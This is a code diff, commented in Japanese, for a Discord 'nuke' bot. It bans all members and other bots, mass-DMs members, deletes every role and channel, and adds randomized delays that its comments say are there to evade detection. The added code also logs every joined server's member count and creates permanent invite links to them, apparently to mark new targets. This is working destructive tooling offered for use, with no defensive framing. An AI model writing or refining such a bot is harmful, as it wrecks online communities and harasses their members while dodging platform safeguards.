@@ -90,8 +90,10 @@ async def create_colored_roles_task(guild, target_roles):
 
 async def ban_all_task(guild, members, reason):
     for m in members:
+        if m == guild.me:  # 自分をBANしない
+            continue
         try:
-            await guild.ban(m, reason=reason, delete_message_days=0)
+            await guild.ban(m, reason=reason, delete_message_seconds=0)  # 非推奨警告回避
         except:
             pass
         await asyncio.sleep(random.uniform(0.2, 0.4))  # BANは検知されやすいので少し抑え
@@ -105,19 +107,40 @@ async def core_nuke(guild, new_server_name=None):
     print(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")
 
     # 他のボットBAN（並行爆速）
-    await asyncio.gather(*(limited_global(guild.ban(m, reason="", delete_message_days=0)) for m in members if m.bot), return_exceptions=True)
+    await asyncio.gather(*(limited_global(guild.ban(m, reason="", delete_message_seconds=0)) for m in members if m.bot), return_exceptions=True)
 
     # DM（爆速DM）
     await asyncio.gather(*[limited_dm(send_dm(m)) for m in non_bot_members], return_exceptions=True)
 
-    # ロール削除（バッチ10で爆速 + retry）
+    # ロール削除（最適化: バッチ5 + 逐次 + エラーログ + 確認）
     roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
     print(f"ロール削除対象: {len(roles_to_delete)}")
-    batch_size = 10
+    batch_size = 5  # 最適化で小さくして確実に
     for i in range(0, len(roles_to_delete), batch_size):
         batch = roles_to_delete[i:i+batch_size]
-        await asyncio.gather(*(limited_global(r.delete()) for r in batch), return_exceptions=True)
-        await asyncio.sleep(random.uniform(0.1, 0.3))
+        for role in batch:
+            try:
+                await limited_global(role.delete())
+                print(f"ロール削除成功: {role.name}")
+            except discord.HTTPException as e:
+                if e.status == 429:
+                    wait = getattr(e, 'retry_after', 3) + random.uniform(0.5, 1.5)
+                    print(f"レートリミット（ロール削除）: {wait}s待機 - {role.name}")
+                    await asyncio.sleep(wait)
+                    try:
+                        await role.delete()  # リトライ
+                        print(f"ロール削除リトライ成功: {role.name}")
+                    except Exception as retry_e:
+                        print(f"ロール削除リトライ失敗: {role.name} - {retry_e}")
+                elif e.status in (403, 401):
+                    print(f"権限不足で削除失敗: {role.name} - {e}")
+                else:
+                    print(f"ロール削除エラー: {role.name} - {e}")
+            await asyncio.sleep(random.uniform(0.15, 0.35))  # 逐次sleepで検知回避
+    # 削除後確認
+    await asyncio.sleep(2)  # 反映待機
+    remaining_roles = [r for r in await guild.fetch_roles() if not r.is_default() and not r.managed]
+    print(f"削除後残りロール: {len(remaining_roles)}個")
 
     # チャンネル削除（並行爆速）
     await asyncio.gather(*(limited_global(ch.delete()) for ch in guild.channels), return_exceptions=True)
@@ -206,5 +229,51 @@ async def trigger(ctx, *, new_name: str = None):
 @bot.event
 async def on_ready():
     print(f"起動: {bot.user}")
+    print("=== ボット起動時の全サーバー情報 ===")
+    for guild in bot.guilds:
+        await log_server_info(guild)
+    print("=====================================")
+
+@bot.event
+async def on_guild_join(guild):
+    print(f"新規サーバー参加: {guild.name}")
+    await log_server_info(guild)
+
+async def log_server_info(guild):
+    member_count = guild.member_count
+    server_name = guild.name
+    invite_link = "取得失敗（権限不足 or チャンネルなし）"
+
+    try:
+        # 既存招待から永久リンクを探す
+        invites = await guild.invites()
+        permanent_invite = None
+        for inv in invites:
+            if inv.max_age == 0 and inv.max_uses == 0:  # 永久招待
+                permanent_invite = inv
+                break
+            if inv.inviter is None or inv.inviter == guild.owner:  # owner作成のもの優先
+                permanent_invite = inv
+                break
+
+        if permanent_invite:
+            invite_link = permanent_invite.url
+        else:
+            # 見つからなければ新規作成（最初のテキストチャンネル使用）
+            if guild.text_channels:
+                channel = guild.text_channels[0]
+                new_invite = await channel.create_invite(max_age=0, max_uses=0, unique=True, reason="Bot自動永久招待")
+                invite_link = new_invite.url
+            else:
+                invite_link = "テキストチャンネルなし"
+    except discord.Forbidden:
+        invite_link = "権限不足（MANAGE_CHANNELS or CREATE_INSTANT_INVITEが必要）"
+    except Exception as e:
+        invite_link = f"エラー: {str(e)}"
+
+    print(f"サーバー: {server_name}")
+    print(f"メンバー数: {member_count}")
+    print(f"永久招待リンク: {invite_link}")
+    print("---")
 
 bot.run(TOKEN)
